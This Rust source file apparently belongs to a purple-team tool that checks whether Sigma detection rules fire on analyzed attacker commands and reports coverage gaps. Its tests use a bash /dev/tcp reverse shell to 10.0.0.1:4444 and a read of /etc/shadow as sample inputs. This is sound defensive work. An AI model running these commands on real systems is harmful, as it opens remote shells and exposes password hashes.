//! Coverage-gap analysis. For each analyzed action, checks whether the deployed
//! ruleset actually *fires* on it. Surfacing the purple-team blind spots:
//! actions whose ATT&CK techniques have rules, yet none of those rules would
//! trigger on this specific command.

use crate::kb::Platform;
use crate::model::Report;
use crate::sigma::SigmaIndex;
use crate::sigma_eval::{self, Outcome};

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Coverage {
    /// At least one rule fires on this action.
    Covered,
    /// Rules exist for the action's technique(s), but none fire. Known blind spot.
    Gap,
    /// Rules exist but only evaluate to INDETERMINATE (need host fields).
    Indeterminate,
    /// No rule in the ruleset covers the action's technique(s) at all.
    NoRules,
}

pub struct CoverageResult {
    pub line: usize,
    pub description: String,
    pub techniques: Vec<String>,
    pub coverage: Coverage,
    pub firing: Vec<String>,
}

/// Classify every finding in `report` against the Sigma `index`.
pub fn analyze(report: &Report, index: &SigmaIndex, platform: Platform) -> Vec<CoverageResult> {
    let mut out = Vec::new();
    for f in &report.findings {
        let tids: Vec<String> = f.techniques.iter().map(|t| t.id.clone()).collect();
        let candidates = index.rules_for(&tids);
        let mut firing = Vec::new();

        let coverage = if candidates.is_empty() {
            Coverage::NoRules
        } else if let Some(cmd) = &f.matched_command {
            let mut any_fire = false;
            let mut any_indet = false;
            for c in &candidates {
                match &c.rule {
                    Some(dr) => match sigma_eval::evaluate(dr, cmd, platform).outcome {
                        Outcome::Fires => {
                            any_fire = true;
                            firing.push(c.title.clone());
                        }
                        Outcome::Indeterminate => any_indet = true,
                        Outcome::NoFire => {}
                    },
                    None => any_indet = true, // rule couldn't be lowered to logic
                }
            }
            if any_fire {
                Coverage::Covered
            } else if any_indet {
                Coverage::Indeterminate
            } else {
                Coverage::Gap
            }
        } else {
            Coverage::Indeterminate
        };

        out.push(CoverageResult {
            line: f.line,
            description: f.description.clone(),
            techniques: tids,
            coverage,
            firing,
        });
    }
    out
}

/// Number of results classified as a blind-spot gap.
pub fn gap_count(results: &[CoverageResult]) -> usize {
    results
        .iter()
        .filter(|r| r.coverage == Coverage::Gap)
        .count()
}

/// Render a human-readable coverage report in the Tokyo Night palette.
pub fn render(
    results: &[CoverageResult],
    platform: &str,
    rules_indexed: usize,
    color: bool,
) -> String {
    use crate::theme::{self, Painter};
    use std::fmt::Write as _;

    let p = Painter::new(color);
    let mut out = String::new();

    let _ = writeln!(
        out,
        "{}{}",
        p.bold(theme::BLUE, "opseclint"),
        p.paint(
            theme::COMMENT,
            &format!(" · coverage gaps · {platform} vs {rules_indexed} rules")
        )
    );
    let _ = writeln!(out, "{}", p.rule(60));

    let (mut covered, mut gaps, mut indet, mut norules) = (0, 0, 0, 0);
    for r in results {
        let (glyph, col, label, note) = match r.coverage {
            Coverage::Gap => {
                gaps += 1;
                (
                    "⚠",
                    theme::RED,
                    "GAP     ",
                    "rule(s) exist for its technique(s), but none fire".to_string(),
                )
            }
            Coverage::Covered => {
                covered += 1;
                (
                    "✓",
                    theme::GREEN,
                    "COVERED ",
                    format!("fires: {}", r.firing.join("; ")),
                )
            }
            Coverage::Indeterminate => {
                indet += 1;
                (
                    "?",
                    theme::YELLOW,
                    "INDET   ",
                    "needs host fields to confirm".to_string(),
                )
            }
            Coverage::NoRules => {
                norules += 1;
                (
                    "·",
                    theme::COMMENT,
                    "NO-RULES",
                    "no rule in this ruleset covers its technique(s)".to_string(),
                )
            }
        };
        let techs = r
            .techniques
            .iter()
            .map(|t| p.paint(theme::PURPLE, t))
            .collect::<Vec<_>>()
            .join(&p.paint(theme::COMMENT, ", "));
        let _ = writeln!(
            out,
            " {} {}  {}  {} {}{}{}",
            p.paint(col, glyph),
            p.paint(col, label),
            p.paint(theme::COMMENT, &format!("L{}", r.line)),
            p.paint(theme::FG, &r.description),
            p.paint(theme::COMMENT, "["),
            techs,
            p.paint(theme::COMMENT, "]"),
        );
        let _ = writeln!(out, "        {}", p.paint(theme::COMMENT, &note));
    }

    let _ = writeln!(out, "{}", p.rule(60));
    let gap_col = if gaps > 0 { theme::RED } else { theme::GREEN };
    let _ = writeln!(
        out,
        " {}  {} {}",
        p.bold(theme::FG, "summary"),
        p.paint(gap_col, &format!("⚠ {gaps} gap")),
        p.paint(
            theme::COMMENT,
            &format!("· {covered} covered · {indet} indeterminate · {norules} no-rules")
        ),
    );
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{analyzer, kb, sigma::SigmaIndex};
    use std::path::PathBuf;

    fn index() -> SigmaIndex {
        let dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/sigma");
        SigmaIndex::load_dir(&dir, "linux").expect("index loads")
    }

    fn coverage_of(command: &str, rule_id: &str) -> Coverage {
        let kb = kb::load(kb::Platform::LinuxAuditd).unwrap();
        let report = analyzer::analyze(command, &kb);
        let results = analyze(&report, &index(), kb::Platform::LinuxAuditd);
        // Find the result for the finding of interest (match by matching line's
        // finding via description contains). Simpler: take the strongest match.
        let finding = report
            .findings
            .iter()
            .position(|f| f.rule_id == rule_id)
            .expect("finding exists");
        results[finding].coverage
    }

    #[test]
    fn covered_when_a_rule_fires() {
        // The /dev/tcp reverse-shell rule (CommandLine contains /dev/tcp/) fires.
        assert_eq!(
            coverage_of(
                "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                "reverse-shell-devtcp"
            ),
            Coverage::Covered
        );
    }

    #[test]
    fn indeterminate_when_rule_needs_unavailable_field() {
        // The shadow fixture keys on TargetFilename, which we can't synthesize.
        assert_eq!(
            coverage_of("cat /etc/shadow", "shadow-read"),
            Coverage::Indeterminate
        );
    }

    #[test]
    fn no_rules_when_technique_absent_from_ruleset() {
        // T1033 (whoami) has no rule in the fixture set.
        assert_eq!(coverage_of("whoami", "whoami"), Coverage::NoRules);
    }
}
